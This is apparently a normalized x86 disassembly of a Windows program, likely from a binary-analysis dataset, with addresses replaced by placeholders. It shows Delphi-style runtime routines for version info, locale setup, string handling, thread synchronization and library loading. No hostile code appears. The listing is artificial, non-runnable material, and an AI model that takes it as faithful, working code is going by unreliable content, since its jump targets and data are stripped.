push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
mov ebx eax
sub_40baac
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40ba9c
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40b7ec
mov eax [ rw-data ]
mov [ eax ] sub_40b9d0
mov eax sub_40b738
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40b754
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40bb30
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403224
xor eax eax
mov [ rw-data ] eax
sub_40bbb0
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_4041cc
sub_40bc40
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40bd16
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_403ff4
lea eax [ ebp - 0x8 ]
call j_sub_404428#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40441c
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bd1d
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
mov eax ebx
call sub_4026bc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40bcf9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40441c
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40bd2c
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40bda4
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_40441c
mov edx esi
dec edx
call sub_40bd2c
sub_40bde0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40421c
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40be08
pop esi
pop ebx
retn
mov eax ebx
call sub_40421c
mov esi eax
sub_40be08
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_40421c
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c018
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40be60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_40421c
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c018
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c018
dec eax
mov ebx eax
sub_40bef0
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40421c
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40be60
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_40421c
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40bf54
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40421c
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_40421c
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40be60
mov eax esi
call sub_40421c
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_40421c
mov [ esp ] eax
jmp r-xdata
sub_40bfdc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_40441c
add eax esi
dec eax
call sub_40bfb4
sub_40c018
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_40441c
add eax ebx
dec eax
call sub_40bfb4
add eax ebx
sub_40c054
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_40441c
push eax
mov eax esi
call sub_40441c
mov ebp eax
mov eax ebp
pop edx
call sub_40c08c
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c08c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_40847c
mov [ esp ] eax
mov eax ebp
call sub_40847c
mov edi eax
mov edx ebp
mov eax esi
call sub_408640
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40bdc8
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408640
mov ebx eax
inc ebx
sub_40c12c
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c154
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c154
test eax eax
jne r-xdata
sub_40c154
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_40862c
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40bdc8
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_40862c
mov edi eax
test edi edi
jne r-xdata
sub_40c194
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c1f8
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_4041cc
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_40800c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c1ff
lea eax [ ebp - 0xc ]
call sub_403f5c
retn
sub_40c208
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c194
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c280
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c268
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c208
pop ecx
push ebp
call sub_40c208
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402d64
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c3f4
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40c6bf
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c280
call sub_40ace4
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40ac34
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403fb0
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40ac34
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_40800c
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40ac34
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_40800c
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40ac80
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40ac80
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40ac34
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_40800c
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40ac80
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40ac34
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40af6c
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403fb0
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40ac34
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40af6c
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403fb0
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40ac80
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40ac34
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403fb0
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40ac34
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403fb0
lea eax [ ebp - 0x8 ]
call sub_403f5c
lea eax [ ebp - 0xc ]
call sub_403f5c
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40ac34
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_40800c
test eax eax
jne r-xdata
call sub_40aebc
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403ff4
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403ff4
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4042dc
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4042dc
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40ac80
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c6c6
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403f80
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40ac34
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_40800c
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40ac34
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_40800c
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_403ff4
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_403ff4
jmp r-xdata
sub_40c774
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40c804
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40abe8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e8
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c80b
lea eax [ ebp - 0x14 ]
call sub_403f5c
retn
sub_40c85c
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_408408
mov [ rw-data ] eax
sub_40c8e0
push ebx
push esi
push edi
push ebp
call sub_403598
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4026dc
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403214
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403580
sub_40c948
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40c930
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40c9d0
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_4079c0
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40c8d0
mov [ ebp ] eax
sub_40c9d0
push ebx
mov ebx eax
mov eax ebx
call sub_40c930
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40c8d0
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40ca10
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031f4
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_40ca84
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax esi
call sub_40cb10
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_40cb10
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40cacc
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40c948
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40c8d8
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40c8b8
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40c8d8
test eax eax
je r-xdata
mov eax edi
call sub_40cacc
test bl bl
je r-xdata
mov eax edi
call sub_40cb00
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40c8b8
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40c8c4
sub_40cbac
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c948
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40c8d8
mov eax ebx
call sub_40cae4
mov eax ebx
call sub_40cad8
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c9c0
sub_40cbfc
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40c948
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40caf0
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40c8c4
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40c8b8
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40caf0
mov eax esi
call sub_40cae4
sub_40cc68
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c948
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40c9c0
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40c8b8
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40cae4
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40cae4
sub_40cce0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40cd04
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40cd7b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_405598
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_4032d8
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cd82
lea eax [ ebp - 0x4 ]
call sub_405598
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_4032d8
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40cce0
test al al
jne r-xdata
mov al 0x1
sub_40cd9c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40ce0e
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40cdf0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40441c
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cdf7
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d270
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d2d8
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d2df
retn
mov eax r-xdata
call sub_403d08
mov eax r-xdata
call sub_403d30
cmp [ rw-data ] 0x0
je r-xdata
call sub_40baac
call sub_40bbb0
call sub_40c85c
call sub_40c3f4
mov eax rw-data
mov edx r-xdata
call sub_403fb0
sub_40d310
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d364
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d3be
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041e4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_408024
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d3c5
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_40d3d0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d42a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041e4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409344
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d431
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_40d43c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d496
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041e4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409318
